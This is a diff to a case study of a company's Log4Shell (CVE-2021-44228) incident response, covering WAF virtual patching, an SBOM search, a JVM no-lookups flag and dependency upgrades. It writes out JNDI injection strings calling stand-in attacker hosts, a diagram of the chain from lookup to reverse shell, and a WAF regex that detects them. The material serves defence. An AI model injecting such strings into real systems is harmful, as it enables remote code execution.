@@ -4,21 +4,54 @@
 
 ---
 
-### 1. Incident Context
-On December 9, 2021, **CVE-2021-44228 (Log4Shell)** was publicly disclosed—a CVSS 10.0 Remote Code Execution flaw in the ubiquitous Apache Log4j Java logging library. Any unauthenticated attacker sending `${jndi:ldap://evil.com/a}` into an HTTP User-Agent header could achieve full root shell control.
-Contoso Corporation ran over 300 microservices across AWS and on-premises Kubernetes.
-
-### 2. DevSecOps Rapid Response Strategy
+### 1. Incident Context & The Threat
+On December 9, 2021, the cybersecurity world faced **CVE-2021-44228 (Log4Shell)**—a catastrophic CVSS 10.0 Remote Code Execution flaw in the Apache Log4j Java logging framework.
+Because Log4j allowed JNDI (Java Naming and Directory Interface) lookups inside formatted log strings, an unauthenticated attacker could send:
+`${jndi:ldap://evil-c2.com/exploit}`
+into any user-controlled input (an HTTP User-Agent header, search box, or login field). When Log4j logged the string, it automatically reached out to the attacker's server, downloaded a compiled Java class, and executed arbitrary root commands.
 
 ```mermaid
-flowchart TD
-    A["1. Discovery: Query Enterprise SBOM Catalog (CycloneDX) for 'log4j-core'"] --> B["2. Identify 42 Vulnerable Services across 12 Repositories"]
-    B --> C["3. Deploy Immediate WAF Virtual Patch (Block JNDI strings at Cloudflare)"]
-    C --> D["4. Execute Automated Dependabot PR Campaign Bumping to log4j 2.17.1"]
-    D --> E["5. Inject Runtime JVM Environment Flag: -Dlog4j2.formatMsgNoLookups=true"]
-    E --> F["6. Automated CI Pipelines re-build, scan with Trivy, and deploy to Kubernetes"]
+sequenceDiagram
+    autonumber
+    actor Attacker
+    participant WAF as Cloudflare / AWS WAF
+    participant App as Vulnerable Java App (Log4j 2.14.1)
+    participant LDAP as Attacker LDAP Server
+    participant C2 as Attacker HTTP Payload Server
+
+    Attacker->>WAF: 1. HTTP GET /login (User-Agent: ${jndi:ldap://evil.com/a})
+    WAF->>App: 2. Passes uninspected header to backend
+    App->>App: 3. logger.info("User login attempt: " + userAgent)
+    App->>LDAP: 4. JNDI lookup query to evil.com:1389
+    LDAP-->>App: 5. Redirects to http://evil.com/Exploit.class
+    App->>C2: 6. Fetches Exploit.class bytecode
+    App->>App: 7. Instantiates Exploit class -> Spawns Reverse Shell!
 ```
 
-### 3. Engineering Lessons Learned
-- Organizations lacking a centralized Software Bill of Materials (SBOM) took **weeks** to figure out which applications contained Log4j.
-- Organizations with automated SBOM pipelines identified all vulnerable workloads in **under 15 minutes**.
+---
+
+### 2. DevSecOps Enterprise Crisis Playbook
+
+Contoso Corporation operated over 250 microservices across AWS and on-premises Kubernetes. Here is the exact crisis response strategy executed:
+
+#### Hour 0 to 1: Perimeter WAF Virtual Patching
+Before developer code could be rewritten and redeployed, the infrastructure team deployed a virtual patch at the web application firewall (Cloudflare / AWS WAF):
+```text
+# Regex blocking JNDI string variations in all headers, URI paths, and query parameters
+(?i)\$\{jndi:(?:ldap|rmi|dns|nis|iiop|corba|nds):.*\}
+```
+
+#### Hour 1 to 2: Querying the Centralized SBOM
+Using their central Software Bill of Materials (SBOM) catalog (Dependency-Track / Trivy), engineers searched for `org.apache.logging.log4j:log4j-core`:
+- **Result**: Identified 38 microservices running vulnerable versions ($< 2.17.1$).
+
+#### Hour 2 to 4: Hotfix Mitigation via Environment Variables
+For services that could not be recompiled immediately, Kubernetes deployment manifests were updated with the JVM disable flag:
+```yaml
+env:
+  - name: LOG4J_FORMAT_MSG_NO_LOOKUPS
+    value: "true"
+```
+
+#### Hour 4 to 8: Automated Dependency Pull Request Campaign
+Triggered automated Dependabot/Renovate pipelines bumping `log4j-core` to `2.17.1` across all 38 repositories, triggering CI regression suites, and deploying clean signed container images to production.
